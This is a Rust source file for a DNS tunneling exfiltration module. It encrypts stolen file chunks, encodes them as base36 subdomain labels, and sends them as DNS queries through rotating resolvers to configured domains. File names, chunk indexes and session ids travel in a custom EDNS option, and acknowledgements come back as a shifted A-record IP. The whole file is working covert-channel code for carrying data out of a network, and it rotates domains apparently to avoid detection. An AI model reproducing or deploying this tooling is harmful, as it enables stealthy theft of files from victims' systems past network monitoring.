use crate::base36;
use crate::config::Config;
use crate::crypto::{derive_key, encrypt};
use crate::metadata::ExfilSession;
use crate::resolver::ResolverPool;
use anyhow::{Context, Result};
use rand::Rng;
use std::net::{Ipv4Addr, SocketAddr, UdpSocket};
use std::time::Duration;
use trust_dns_proto::op::{Edns, Message, MessageType, OpCode, Query};
use trust_dns_proto::rr::{rdata::opt::EdnsOption, Name, RData, RecordType};
use trust_dns_proto::serialize::binary::{BinEncodable, BinEncoder};

const OPT_CODE: u16 = 65001;
const FLAG_HEADER: u8 = 0x01;
const FLAG_FINAL_CHUNK: u8 = 0x02;
const FLAG_COMPLETE: u8 = 0x04;

pub struct DnsTransmitter {
    cfg: Config,
    pool: ResolverPool,
    aes_key: [u8; 32],
    last_domain: Option<String>,
    ack_next: Ipv4Addr,
}

impl DnsTransmitter {
    pub fn new(cfg: Config, pool: ResolverPool) -> Self {
        let aes_key = derive_key(cfg.encryption_key);
        let ack_ip = cfg
            .server_ip()
            .parse::<Ipv4Addr>()
            .unwrap_or_else(|_| Ipv4Addr::new(127, 0, 0, 1));
        let ack_next = increment_ip(ack_ip);
        Self {
            cfg,
            pool,
            aes_key,
            last_domain: None,
            ack_next,
        }
    }

    pub fn send_header(&mut self, session: &ExfilSession) -> Result<()> {
        self.send_frame(session, None, &[], FLAG_HEADER)
    }

    pub fn send_chunk(&mut self, session: &ExfilSession, index: usize, chunk: &[u8]) -> Result<()> {
        let mut flags = 0u8;
        if index + 1 >= session.job.total_chunks {
            flags |= FLAG_FINAL_CHUNK;
        }
        self.send_frame(session, Some(index), chunk, flags)
    }

    pub fn send_completion(&mut self, session: &ExfilSession) -> Result<()> {
        self.send_frame(session, None, &[], FLAG_COMPLETE)
    }

    fn send_frame(
        &mut self,
        session: &ExfilSession,
        chunk_index: Option<usize>,
        payload: &[u8],
        flags: u8,
    ) -> Result<()> {
        let ciphertext = encrypt(payload, &self.aes_key).map_err(|e| anyhow::anyhow!("{e}"))?;
        let encoded = base36::encode(&ciphertext);
        let qname = self.build_name(&encoded)?;
        let metadata = build_metadata(session, chunk_index, payload.len(), flags);

        let mut last_err = None;
        for attempt in 0..3 {
            let resolver = self.pool.next();
            match self.dispatch(&qname, &metadata, resolver) {
                Ok(true) => return Ok(()),
                Ok(false) => {
                    last_err = Some(anyhow::anyhow!(
                        "resolver {} rejected chunk (attempt {})",
                        resolver,
                        attempt + 1
                    ));
                }
                Err(e) => last_err = Some(e),
            }
        }

        Err(last_err.unwrap_or_else(|| anyhow::anyhow!("failed to send frame")))
    }

    fn dispatch(&self, name: &Name, metadata: &[u8], resolver: SocketAddr) -> Result<bool> {
        let mut msg = Message::new();
        msg.set_id(rand::thread_rng().gen());
        msg.set_message_type(MessageType::Query);
        msg.set_op_code(OpCode::Query);
        msg.set_recursion_desired(true);
        msg.add_query(Query::query(name.clone(), RecordType::A));

        let mut edns = Edns::new();
        edns.set_dnssec_ok(false);
        edns.set_max_payload(512);
        edns.options_mut()
            .insert(EdnsOption::Unknown(OPT_CODE, metadata.to_vec()));
        msg.set_edns(edns);

        let mut buf = Vec::with_capacity(512);
        let mut encoder = BinEncoder::new(&mut buf);
        msg.emit(&mut encoder)?;

        let socket = UdpSocket::bind((Ipv4Addr::UNSPECIFIED, 0))?;
        socket.set_read_timeout(Some(Duration::from_secs(2)))?;
        socket.send_to(&buf, resolver)?;

        let mut resp_buf = [0u8; 512];
        let (size, _) = socket.recv_from(&mut resp_buf)?;
        let resp = Message::from_vec(&resp_buf[..size])?;

        let ack = resp
            .answers()
            .iter()
            .find_map(|record| match record.data() {
                Some(RData::A(ip)) => Some(ip.0),
                _ => None,
            });

        Ok(matches!(ack, Some(ip) if ip == self.ack_next))
    }

    fn build_name(&mut self, encoded: &str) -> Result<Name> {
        let mut labels = Vec::new();
        let mut idx = 0;
        while idx < encoded.len() {
            let end = (idx + 62).min(encoded.len());
            labels.push(&encoded[idx..end]);
            idx = end;
        }
        if labels.is_empty() {
            labels.push("0");
        }

        let domain = self.select_domain();
        let fqdn = format!("{}.{}", labels.join("."), domain);
        Name::from_ascii(fqdn).context("invalid query name")
    }

    fn select_domain(&mut self) -> String {
        let domains = self.cfg.dns_domains();
        if domains.is_empty() {
            return "example.com".to_string();
        }

        if domains.len() == 1 {
            self.last_domain = Some(domains[0].to_string());
            return domains[0].to_string();
        }

        let mut rng = rand::thread_rng();
        let mut candidates: Vec<&str> = domains.iter().copied().collect();
        if let Some(last) = &self.last_domain {
            candidates.retain(|d| d != last);
            if candidates.is_empty() {
                candidates = domains.iter().copied().collect();
            }
        }

        let choice = candidates[rng.gen_range(0..candidates.len())].to_string();
        self.last_domain = Some(choice.clone());
        choice
    }
}

/// Construct EDNS option payload describing the current transfer frame.
/// This metadata mirrors the layout expected by the DNS server and Archon.
fn build_metadata(
    session: &ExfilSession,
    chunk_index: Option<usize>,
    payload_len: usize,
    flags: u8,
) -> Vec<u8> {
    let mut buf = Vec::with_capacity(160);
    buf.push(1); // version
    buf.push(flags);
    buf.extend_from_slice(&session.session_id.to_be_bytes());
    buf.extend_from_slice(&session.job.job_id.to_be_bytes());
    let idx = chunk_index.map(|i| i as u32).unwrap_or(u32::MAX);
    buf.extend_from_slice(&idx.to_be_bytes());
    buf.extend_from_slice(&(session.job.total_chunks as u32).to_be_bytes());
    buf.extend_from_slice(&(payload_len as u16).to_be_bytes());
    buf.extend_from_slice(&(session.job.total_size as u64).to_be_bytes());

    let name_bytes = session.job.file_name.as_bytes();
    let name_len = name_bytes.len().min(63);
    buf.push(name_len as u8);
    buf.extend_from_slice(&name_bytes[..name_len]);

    let note_bytes = session.job.note.as_bytes();
    let note_len = note_bytes.len().min(63);
    buf.push(note_len as u8);
    buf.extend_from_slice(&note_bytes[..note_len]);
    buf
}

fn increment_ip(ip: Ipv4Addr) -> Ipv4Addr {
    let mut octets = ip.octets();
    for idx in (0..4).rev() {
        if octets[idx] == 255 {
            octets[idx] = 0;
        } else {
            octets[idx] += 1;
            break;
        }
    }
    Ipv4Addr::from(octets)
}
